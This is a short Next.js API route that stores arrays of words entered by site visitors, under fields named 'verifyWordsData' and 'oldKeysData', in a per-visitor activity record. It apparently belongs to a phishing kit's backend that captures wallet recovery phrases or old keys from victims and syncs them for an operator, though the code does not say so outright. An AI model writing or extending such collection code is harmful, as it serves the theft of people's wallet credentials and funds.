import { NextRequest, NextResponse } from "next/server"
import { getActivity, setActivity } from "@/lib/activity-store"

export async function POST(req: NextRequest) {
  try {
    const { visitorId, field, enteredWords } = await req.json()

    if (!visitorId || !field || !enteredWords) {
      return NextResponse.json({ error: "Missing fields" }, { status: 400 })
    }

    const activity = await getActivity(visitorId)

    if (!activity) {
      return NextResponse.json({ error: "Activity not found" }, { status: 404 })
    }

    if (field === "verifyWordsData") {
      activity.verifyWordsData = {
        ...(activity.verifyWordsData || {}),
        enteredWords: [...enteredWords],
      }
    } else if (field === "oldKeysData") {
      activity.oldKeysData = {
        ...(activity.oldKeysData || {}),
        enteredWords: [...enteredWords],
      }
    }

    activity.lastUpdated = new Date().toISOString()

    await setActivity(visitorId, { ...activity })

    return NextResponse.json({ success: true })
  } catch {
    return NextResponse.json({ error: "Failed to sync" }, { status: 500 })
  }
}
